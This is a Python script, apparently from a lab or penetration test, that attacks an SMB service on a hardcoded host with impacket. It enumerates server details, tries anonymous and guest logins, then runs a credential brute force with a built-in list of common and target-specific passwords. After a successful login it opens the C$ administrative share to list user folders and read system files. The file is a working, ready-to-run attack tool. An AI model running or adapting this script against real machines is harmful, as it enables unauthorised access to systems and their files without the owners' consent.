#!/usr/bin/env python3
"""
SMB penetration using impacket
Target: 192.168.233.129
"""
import sys
import time

target = '192.168.233.129'

try:
    from impacket.smbconnection import SMBConnection, SessionError
    from impacket.smb import SMB_DIALECT
    from impacket.nmb import NetBIOSError
except ImportError:
    print("[-] impacket not available")
    sys.exit(1)

def enum_smb_info():
    """Enumerate SMB server info"""
    print("[*] Connecting to SMB server...")
    try:
        conn = SMBConnection(target, target, sess_port=445, timeout=10)
        print(f"[+] Connected! ServerName: {conn.getServerName()}")
        print(f"[+] ServerDomain: {conn.getServerDomain()}")
        print(f"[+] ServerOS: {conn.getServerOS()}")
        print(f"[+] ServerOSMajor: {conn.getServerOSMajor()}")
        print(f"[+] ServerOSMinor: {conn.getServerOSMinor()}")
        print(f"[+] ServerOSBuild: {conn.getServerOSBuild()}")
        print(f"[+] RequireMessageSigning: {conn.isSigningRequired()}")
        print(f"[+] IsLoginRequired: {conn.isLoginRequired()}")
        conn.logoff()
        return True
    except Exception as e:
        print(f"[-] SMB connection failed: {e}")
        return False

def try_anonymous():
    """Try anonymous/guest login"""
    print("\n[*] Trying anonymous login...")
    try:
        conn = SMBConnection(target, target, sess_port=445, timeout=10)
        try:
            conn.login('', '')
            print("[+] Anonymous login SUCCESS!")
            enum_shares(conn)
            conn.logoff()
            return True
        except (SessionError, Exception) as e:
            print(f"[*] Anonymous: {e}")
        
        # Try guest
        try:
            conn.login('guest', '')
            print("[+] Guest login SUCCESS!")
            enum_shares(conn)
            conn.logoff()
            return True
        except (SessionError, Exception) as e:
            print(f"[*] Guest: {e}")
        
        conn.logoff()
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

def enum_shares(conn):
    """Enumerate shares"""
    try:
        shares = conn.listShares()
        print("[+] Shares:")
        for share in shares:
            name = share['shi1_netname'][:-1]
            remark = share['shi1_remark'][:-1] if share['shi1_remark'] else ''
            print(f"    - {name} ({remark})")
            
            # Try to access each share
            try:
                conn.connectTree(name)
                print(f"      -> ACCESSIBLE!")
                # List files
                files = conn.listPath(name, '\\')
                for f in files[:10]:
                    print(f"      -> {f.get_longname()}")
            except:
                print(f"      -> Access denied")
    except Exception as e:
        print(f"[-] Share enum error: {e}")

def brute_force():
    """Brute force with common credentials"""
    print("\n[*] Starting SMB brute force...")
    
    usernames = [
        'lkjm', 'administrator', 'admin', 'guest', 'user', 'test',
        'Administrator', 'Admin', 'support', 'helpdesk'
    ]
    
    passwords = [
        '', '123', '1234', '123456', '12345678',
        'password', 'Password1', 'admin', 'admin123',
        'P@ssw0rd', '123456789', 'qwerty', 'abc123',
        'Welcome1', 'letmein', 'monkey', 'dragon',
        'lkjm', 'lkjm123', 'lkjm1234',
        'test', 'test123', 'root', 'toor',
        'pass', 'pass123', 'changeme',
        '000000', '111111', '666666', '888888',
        'Windows1', 'Win10', 'vmware', 'VMware1',
        'Aa123456', '1qaz2wsx', 'q1w2e3r4',
        'Admin@123', 'P@ss1234', 'Passw0rd',
        'admin@123', '1234567890', 'password1',
        'iloveyou', 'trustno1', 'sunshine',
        'master', 'shadow', 'michael', 'superman',
    ]
    
    total = len(usernames) * len(passwords)
    count = 0
    found = False
    
    for user in usernames:
        if found:
            break
        for pwd in passwords:
            count += 1
            if count % 10 == 0:
                sys.stdout.write(f"\r[*] {count}/{total} - {user}:{pwd[:15]}")
                sys.stdout.flush()
            
            try:
                conn = SMBConnection(target, target, sess_port=445, timeout=5)
                conn.login(user, pwd)
                print(f"\n[+] CRACKED! {user}:{pwd}")
                
                # Get server info
                print(f"[+] ServerOS: {conn.getServerOS()}")
                print(f"[+] ServerName: {conn.getServerName()}")
                
                # Enumerate
                enum_shares(conn)
                
                # Try to read interesting files
                try:
                    conn.connectTree('C$')
                    print("\n[+] C$ accessible! Reading interesting files...")
                    
                    # List users
                    try:
                        files = conn.listPath('C$', '\\Users\\*')
                        print("[*] Users directory:")
                        for f in files:
                            if f.get_longname() not in ['.', '..']:
                                print(f"    {f.get_longname()}")
                    except:
                        pass
                    
                    # Read hostname
                    try:
                        fh = conn.openFile('C$', '\\Windows\\System32\\drivers\\etc\\hosts')
                        data = conn.readFile('C$', fh)
                        print(f"\n[*] hosts file:\n{data.decode('utf-8', errors='ignore')[:500]}")
                        conn.closeFile('C$', fh)
                    except:
                        pass
                    
                except:
                    print("[-] C$ not accessible")
                
                conn.logoff()
                found = True
                return (user, pwd)
                
            except Exception:
                pass
    
    print(f"\n[-] No credentials found ({count} attempts)")
    return None

if __name__ == '__main__':
    print("=" * 60)
    print(f"SMB Penetration via impacket - {target}")
    print("=" * 60)
    
    # 1. Server info
    enum_smb_info()
    
    # 2. Anonymous/Guest
    try_anonymous()
    
    # 3. Brute force
    creds = brute_force()
    
    print("\n" + "=" * 60)
    if creds:
        print(f"[+] SUCCESS! Credentials: {creds[0]}:{creds[1]}")
    else:
        print("[-] SMB penetration failed")
    print("=" * 60)